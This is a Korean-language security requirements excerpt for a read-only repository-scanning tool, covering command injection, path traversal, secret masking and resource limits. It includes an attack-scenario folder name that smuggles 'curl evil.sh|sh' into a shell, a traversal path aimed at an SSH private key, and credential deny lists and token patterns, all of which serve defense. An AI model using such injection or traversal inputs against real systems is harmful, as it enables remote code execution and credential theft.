## 2. Must — Phase 1에서 반드시 구현

### S-1. 명령어 주입 차단 (가장 심각한 위협)

**위협**: 이 도구는 `child_process` 로 `git` 을 반복 호출합니다. `repo_root` 는 **`graph.json` 과 파일시스템에서 온 값**이고, 형제 저장소의 커밋 제목·브랜치명도 읽습니다. 셸을 경유하면 **임의 명령 실행**이 가능합니다.

```
공격 시나리오: search_roots 아래에 폴더명이  test$(curl evil.sh|sh)  인 디렉터리가 존재
             → 셸 경유 실행 시 그대로 실행됨
```

| ID | 요구사항 |
|----|---------|
| S-1.1 | **`shell: true` 를 절대 쓰지 않는다.** `execFile`/`spawn` 에 **인자 배열**로만 전달 |
| S-1.2 | `exec`·`execSync` **사용 금지**(셸 경유). `execFileSync`·`spawnSync` 만 |
| S-1.3 | 경로는 항상 `-C <path>` 형태의 **분리된 인자**로 전달. 문자열 결합 금지 |
| S-1.4 | `--` 로 옵션과 경로를 분리 (`-` 로 시작하는 폴더명이 옵션으로 해석되는 것 방지) |
| S-1.5 | git 실행에 **타임아웃 5초** · **출력 상한 1MB** |

**수용 기준** (M2 `done_when` 에 편입)

- [ ] 코드 전체에 `shell: true`·`exec(`·`execSync(` **0건** (grep 입증)
- [ ] 폴더명이 `test$(echo INJECTED)` 인 픽스처 스캔 → **`INJECTED` 가 출력·파일 어디에도 없음**
- [ ] `-x` 로 시작하는 폴더명 픽스처 → git이 옵션으로 오해하지 않음

### S-2. 경로 조작 차단 (Path Traversal)

**위협**: `markers[].file`·`prd_path`·`checkpoint_path` 는 **경로 문자열**입니다. `../../../../Users/PC/.ssh/id_rsa` 가 들어가면 **저장소 밖 파일을 읽습니다.** `graph.json` 은 git으로 공유되므로 변조 경로가 존재합니다.

| ID | 요구사항 |
|----|---------|
| S-2.1 | 모든 경로는 **`path.resolve()` 정규화 후** 사용 (심볼릭 링크는 `fs.realpathSync`) |
| S-2.2 | 정규화 결과가 **`search_roots` 하위가 아니면 거부**하고 `resolve_status: "rejected_path"` 표시 |
| S-2.3 | `markers[].file` 은 **상대 경로만 허용**. `..`·절대 경로·드라이브 문자로 시작하면 **로드 시점에 거부** |
| S-2.4 | 심볼릭 링크는 **따라가지 않는다**(`lstat` 판별 후 건너뜀). 순환 참조 무한 탐색 방지 |
| S-2.5 | 읽는 파일 크기 상한 **5MB** (`CHECKPOINT.md` 최대 실측 1,243줄이므로 충분) |

**수용 기준**

- [ ] `markers[].file` 에 `../../secret.txt` 를 넣은 픽스처 → **거부되고 파일을 읽지 않음**
- [ ] `search_roots` 밖을 가리키는 심볼릭 링크 → 건너뛰고 경고
- [ ] 5MB 초과 파일 → 읽지 않고 `"파일이 너무 큼"` 표시

### S-3. 읽기 전용 불변식 (이 프로젝트의 최대 보안 요구사항)

**위협**: 형제 저장소에 쓰기가 발생하면 **사용자 결정 위반**이자 **다른 세션의 작업 파괴**입니다. 2026-08-02 02:32~02:41에 다른 세션이 형제를 동시 작업 중이었음이 **실측**됐습니다.

**심층 방어 3겹**

| 겹 | 내용 |
|----|------|
| ① 코드 | `lib/scan.mjs`·`resolve.mjs` 에서 **쓰기 API import 금지** (`writeFile`·`appendFile`·`rm`·`rename`) |
| ② 래퍼 | 모든 파일 쓰기는 **`lib/safeWrite.mjs` 한 곳**을 통과. 대상이 소담그래프엔지니어링 저장소 또는 `~/.sodam/graph-state.json` 이 아니면 **throw** |
| ③ git | **읽기 전용 서브커맨드 화이트리스트**만 허용 — `status`·`log`·`remote`·`rev-parse`·`cat-file`·`ls-files`. `add`·`commit`·`checkout`·`clean`·`reset`·`push` **차단** |

**수용 기준**

- [ ] `scan.mjs`·`resolve.mjs` 에 쓰기 API **0건** (grep)
- [ ] `safeWrite` 에 형제 경로를 넘기면 **throw** (단위 테스트)
- [ ] 화이트리스트 밖 git 서브커맨드 호출 시 **throw**
- [ ] 전체 스캔 전후 형제 6곳 `git status --porcelain` **동일**

### S-4. 비밀정보 비수집 (Secret Hygiene)

**위협**: 형제 저장소를 훑으면서 시크릿이 **딸려 들어올 수 있습니다.**
`git log` 의 커밋 제목 · `tracking_files` 에 잡히는 `.env` · 1층 추출이 읽는 `CHECKPOINT.md` 본문. 특히 **`~/.sodam/graph-state.json` 은 6형제가 읽는 공유 파일**이라 유출 반경이 가장 넓습니다.

| ID | 요구사항 |
|----|---------|
| S-4.1 | **읽지 않는 파일(deny list)**: `.env*`·`*.pem`·`*.key`·`*.p12`·`*.pfx`·`id_rsa*`·`credentials*`·`*secret*`·`.npmrc`·`.netrc`·`*.keystore`·서비스 계정 JSON |
| S-4.2 | `tracking_files` 에 위 파일들을 **이름조차 넣지 않는다** (존재 사실도 정보) |
| S-4.3 | 1층 추출은 **숫자·날짜·개수만** 뽑는다. **본문 문자열을 스냅샷에 저장하지 않는다** — 🔧 **예외(2026-08-03 명문화)**: `02_DATA_MODEL.md` §1.5층 추출(`open_items`)은 ① 최대 3건 ② S-4.4와 동일 마스킹 적용 ③ 120자 초과 시 자름 ④ `graph-state.json`(S-6.1 6필드 화이트리스트)에는 **미포함**을 전부 지키는 한 허용한다. 근거: `02` §1.5층 L-1~L-5. 이 예외가 없으면 W-2(1.5층 추출)가 이 항목을 위반하게 된다 |
| S-4.4 | `git_last_commit_subject` 는 저장 전 **시크릿 패턴 마스킹** — `ghp_`·`github_pat_`·`sk-`·`xox[baprs]-`·`AKIA`·`AIza`·`-----BEGIN` 발견 시 `[REDACTED]` 치환 |
| S-4.5 | **`graph-state.json` 에는 커밋 제목을 아예 넣지 않는다** — 판정에 불필요하고 공유 반경이 넓음 |
| S-4.6 | `graph.json`·`shadow/*.md` 는 git 추적 대상 — **사람이 시크릿을 적지 않도록 `04` "절대 하지 마"에 명시** |
| S-4.7 | **`.gitignore` 에 `data/snapshot.json` 필수** |

**수용 기준**

- [ ] `.env` 가 있는 픽스처 스캔 → `snapshot.json`·`graph-state.json` 어디에도 **`.env` 문자열 없음**
- [ ] 커밋 제목에 `ghp_xxxxxxxxxxxx`(합성 더미)를 넣은 픽스처 → 저장값이 `[REDACTED]`
- [ ] `graph-state.json` 에 **커밋 제목 필드가 없음** 확인

### S-5. 자원 한계 (자기 자신에 대한 DoS 방어)

**위협**: `search_roots` 아래에 **60개 이상의 폴더**가 있습니다(실측). 깊은 트리·심볼릭 링크 순환·거대 파일이면 **세션 시작이 멈춥니다.** 통증 ②를 풀려던 기능이 세션을 망가뜨립니다.

| ID | 항목 | 상한 |
|----|------|------|
| S-5.1 | 탐색 깊이 | **4단계** |
| S-5.2 | 방문 디렉터리 수 | **500개** |
| S-5.3 | 세션 시작 hook 전체 시간 | **1,000ms** (`07` 규약 E5) — 초과 시 캐시만 읽고 백그라운드 재스캔 |
| S-5.4 | git 명령 1건 타임아웃 | **5초** |
| S-5.5 | 읽는 파일 크기 | **5MB** |
| S-5.6 | `graph-state.json` 크기 | **4KB** (`02` 발행 규격) |

**수용 기준**

- [ ] 심볼릭 링크 순환 픽스처 → **무한 루프 없이 종료**
- [ ] `time node hooks/session-start.mjs` **1초 미만** (60+ 폴더 실환경)

### S-7. 입력 검증 — 신뢰 경계

**모든 외부 입력을 신뢰하지 않습니다.** 이 프로젝트의 "외부 입력"은 웹 폼이 아니라 아래 4가지입니다.

| 입력원 | 신뢰 | 검증 규칙 |
|--------|------|----------|
| **명령 인자** (`/graph-where 소담루프엔지니어링`) | ❌ | 허용 문자 `[가-힣A-Za-z0-9_.-]`, 길이 ≤100. 부분 일치 허용하되 **2건 이상 매칭 시 후보 표시 후 중단** |
| **`graph.json` 값** | ❌ | `id` = `^[a-z][a-z0-9-]{2,40}$` · `repo_remote` = `^[\w.-]+/[\w.-]+$` · `state` 는 열거값 · 날짜는 `YYYY-MM-DD` |
| **파일시스템 결과** (폴더명·커밋 제목) | ❌ | S-1·S-2·S-4 규칙 적용 |
| **환경변수** (`SODAM_GRAPH_ROOT`) | ❌ | 존재하는 디렉터리인지 확인 후 정규화. 아니면 무시하고 `config` 기본값 |

**수용 기준**

- [ ] `graph.json` 의 `id` 에 `../` → **로드 실패 + 어느 필드가 잘못됐는지 표시**
- [ ] `/graph-where` 에 100자 초과 입력 → 거부
- [ ] `SODAM_GRAPH_ROOT` 에 없는 경로 → 경고 후 기본값 사용

### S-13. 보안 설정 — 디버그 · 운영/개발 분리 · 환경변수

> 이 프로젝트에는 CORS·쿠키·보안 헤더가 없지만(§7), **디버그 설정과 운영/개발 분리는 실제로 존재하는 위험**입니다.

#### S-13-A. 디버그 출력

**위협**: 디버그를 켜면 **경로·파일 내용·커밋 제목**이 그대로 화면과 로그에 나옵니다. 스크린샷을 공유하거나 이슈에 붙이면 **§5 비밀정보 관리가 무력화**됩니다.

| ID | 요구사항 |
|----|---------|
| S-13.1 | **디버그는 기본 꺼짐**(안전한 기본값). `SODAM_GRAPH_DEBUG=1` 일 때만 켜짐 |
| S-13.2 | 디버그 출력에도 **S-4 마스킹을 그대로 적용** — 디버그라고 시크릿을 원문으로 찍지 않음 |
| S-13.3 | **파일 내용 본문을 출력하지 않음.** 디버그는 *판정 근거*(개수·날짜·경로 결과)까지만 |
| S-13.4 | **스택 트레이스를 사용자에게 그대로 던지지 않음** — 내부 절대경로·사용자명이 노출됨. 사람이 읽을 한 줄 메시지 + `SODAM_GRAPH_DEBUG=1` 안내 |
| S-13.5 | 디버그 로그를 **파일로 남기지 않음**(Phase 1). 남겨야 하면 `data/` 안에 두고 `.gitignore` |

#### S-13-B. 운영 / 개발 설정 분리

## 7. 현재 해당 없는 항목 — 발동 조건 명시

> **없는 위협을 적으면 진짜 위협이 묻힙니다.** 다만 **미래에 생기면 자동으로 살아나도록** 조건을 못 박아 둡니다.

| 항목 | 현재 | 🔴 발동 조건 (그때 반드시 구현) |
|------|------|---------------------------|
| **인증·로그인** | 해당 없음 (계정 개념 없음) | 팀 공유·다중 사용자 전환 시 → ASVS V2. 비밀번호는 **bcrypt/argon2**, 평문 저장 절대 금지 |
| **인가·권한 분리**(관리자/일반/비로그인) | 해당 없음 (본인 전용) | 위와 동일. 보호 자원 미인증 **401**, 타인 자원 접근 **403** |
| **세션·JWT·쿠키** | 해당 없음 | 웹·서버 도입 시 → JWT는 **httpOnly + `sameSite:'strict'` + `secure:true` 쿠키**, 만료 명시. **localStorage 저장 금지** |
| **CORS·보안 헤더** | 해당 없음 (HTTP 리스너 없음) | 대시보드 도입 시 → 기본 거부 + 명시적 허용, `127.0.0.1` 바인딩 |
| **SQL Injection** | 해당 없음 (DB 없음) | 그래프 DB 도입 시 → **S-11.6 파라미터 바인딩** |
| **XSS** | 해당 없음 (HTML 렌더링 없음) | 웹 UI 도입 시 → 출력 이스케이프, CSP |
| **CSRF** | 해당 없음 | 상태 변경 HTTP 엔드포인트 생길 때 |
| **파일 업로드** | 해당 없음 (업로드 기능 없음) | 생길 경우 → MIME + 크기 제한 + 경로 주입 방지 + 실행 권한 제거 |
| **암호화·보안 난수** | 해당 없음 (보안 토큰 미사용) | 초대 코드·재설정 토큰·nonce 생성 시 → **`crypto.randomBytes()`**. `Math.random()` 절대 금지, 만료 시각 필수 |
| **감사 로그** | 해당 없음 | 다중 사용자·자동 실행 도입 시 |

**발동 조건이 충족되면 `01_PRD.md` 재개정 조건 ②(결정 뒤집힘)에 해당하므로 PRD를 다시 엽니다.**

## 8. Secure by Design 원칙 매핑

| 원칙 | 이 프로젝트에서의 적용 |
|------|---------------------|
| **안전한 기본값** | 읽기 전용이 기본. 쓰기는 `safeWrite` 한 곳으로만 예외 허용 |
| **최소 권한** | 쓰는 곳이 2군데뿐. git은 읽기 서브커맨드 화이트리스트 |
| **심층 방어** | 읽기전용 3겹(코드·래퍼·git 화이트리스트), 주입 방어 2겹(셸 미사용·인자 분리) |
| **명시적 실패** | 못 찾으면 `lost`, 경로 위반이면 `rejected_path`, 스키마 깨지면 중단. **조용한 통과 없음** |
| **공격면 최소화** | 서버·DB·인증·npm 패키지 **0개**를 의도적으로 유지 |
| **비밀 없음이 최선** | 시크릿을 아예 안 쓰는 상태를 설계 목표로 유지 |
